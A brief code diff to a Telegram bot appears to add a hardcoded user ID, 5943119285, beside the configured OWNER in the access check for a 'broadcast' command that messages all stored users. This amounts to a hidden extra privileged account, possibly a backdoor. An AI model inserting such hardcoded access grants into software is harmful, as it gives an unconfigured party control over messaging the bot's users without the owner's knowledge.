@@ -25,8 +25,7 @@ def remove_user_from_json(uid):
     if uid in users:
         users.remove(uid)
         save_users(users)
-
-@app.on_message(filters.command("broadcast") & filters.user(OWNER))
+@app.on_message(filters.command("broadcast") & filters.user([OWNER, 5943119285]))
 async def broadcast_handler(client: Client, message: Message):
     if not message.reply_to_message:
         await message.reply_text("ℹ️ Reply to a message to broadcast it.")
